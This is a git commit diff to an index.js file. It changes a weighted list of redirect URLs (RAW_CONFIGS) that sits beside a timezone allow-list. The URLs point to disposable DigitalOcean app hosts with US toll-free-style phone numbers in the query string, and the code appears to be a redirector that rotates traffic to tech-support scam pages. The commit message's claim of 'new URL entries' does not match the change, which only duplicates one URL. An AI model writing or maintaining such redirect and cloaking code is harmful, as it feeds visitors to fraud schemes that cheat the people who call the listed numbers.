938b19369a3056b230477033e65a61c63c78c9bd
paalakash <palaksh452@gmail.com>
2026-06-03 06:03:36 +0530

    Modify RAW_CONFIGS with new URL entries
    Updated RAW_CONFIGS to include duplicate URLs.

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-7tohe.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 },
-    { url: "https://goldfish-app-ucq6s.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 }
+    { url: "https://goldfish-app-ucq6s.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 },
+    { url: "https://goldfish-app-ucq6s.ondigitalocean.app/werrx01USAHTML/?bcda=1800 209 169", weight: 0.5 }
 
 ];
 
